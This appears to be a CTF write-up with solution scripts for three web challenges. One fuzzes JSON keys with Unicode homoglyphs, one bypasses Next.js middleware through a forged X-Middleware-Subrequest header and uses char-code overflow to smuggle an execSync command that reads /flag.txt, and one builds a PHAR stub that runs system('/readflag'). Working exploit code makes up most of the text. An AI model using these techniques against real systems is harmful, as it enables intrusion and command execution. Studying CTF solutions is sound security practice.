# go-phish
Tags: #parser #json #go

```python
import requests

char_map = {
    'r': ['\uFF52'],
    'e': ['\uFF45'],
    'q': ['\uFF51'],
    'u': ['\uFF55'],
    's': ['\uFF53', '\u017F'],
    't': ['\uFF54'],
}

fuzzed_keys = set()
base_key = "request"

for i, char_in_key in enumerate(base_key):
    if char_in_key in char_map:
        for fuzzed_char in char_map[char_in_key]:
            fuzzed_key = list(base_key)
            fuzzed_key[i] = fuzzed_char
            fuzzed_keys.add("".join(fuzzed_key))

fuzzed_keys.add("".join([char_map.get(c, [c])[0] for c in base_key]))


print(f"[*] Starting fuzzer with {len(fuzzed_keys)} key variations...")

for key in fuzzed_keys:
    payload = {
        "username": "admin",
        "password": "admin",
        key: "givemeflagpls"
    }

    try:
        response = requests.post("https://074378f9c7d6d95f4c52247e.deadsec.quest/login", json=payload)

        if "Wrong" not in response.text and response.status_code == 200:
            print(f"\n[+] Potential vulnerability found with key: {key.encode('utf-8')}")
            print(f"[+] Payload sent: {payload}")
            print(f"[+] Response status: {response.status_code}")
            print(f"[+] Response text: {response.text}")
            break
    except requests.exceptions.RequestException as e:
        print(f"[-] An error occurred: {e}")
        break
else:
    print("\n[*] Fuzzer finished. No vulnerability found with the current wordlist.")
```
`reque\xc5\xbft`

`DEAD{91c1ccc6b6fa2367_8f657fa7f7c0b293}`

# Game Tester
#nextjs #code-injection #js #char-code
```python
import requests

code = "process.mainModule.require('child_process').execSync('echo $(cat /flag.txt) > /app/public/images/card1.png')"

def generate_conditional_char_codes(target_string):
  char_codes = []
  for char in target_string:
    original_code = ord(char)
    if 65 <= original_code <= 122:
      new_code = original_code + 65536
      char_codes.append(str(new_code))
    else:
      char_codes.append(str(original_code))  
  return f"[{','.join(char_codes)}]"

ctf_script = generate_conditional_char_codes(code)
print(ctf_script)

r = requests.post("https://f5658e50bf69f3a707481321.deadsec.quest/admin", headers={"Next-Action":"40b09c168a52a9fc66baec12eb4da67b7f0b4a303a", "X-Middleware-Subrequest": "src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware"}, json=[{"codeArray": ctf_script}])
print(r.text)
r = requests.get("https://f5658e50bf69f3a707481321.deadsec.quest/images/card1.png")
print(r.text)
```

`DEAD{m1Ddl3w4r3_bYp4$$_4nD_un1c0d3_0v3rfl0w_a2b24c4da2f157d0}`

# baby-web
#php #phar
Gzip the following to bypass all the restrictions:
`php --define phar.readonly=0 gen_phar.php`
```php
<?php
$phar = new Phar('exploit.phar');
$phar->startBuffering();

$stub = <<<'STUB'
<?php
    system('/readflag');
    __HALT_COMPILER();
?>
STUB;

$phar->setStub($stub);
$phar->addFromString('dummy.txt', 'dummy');
$phar->stopBuffering();

?>
```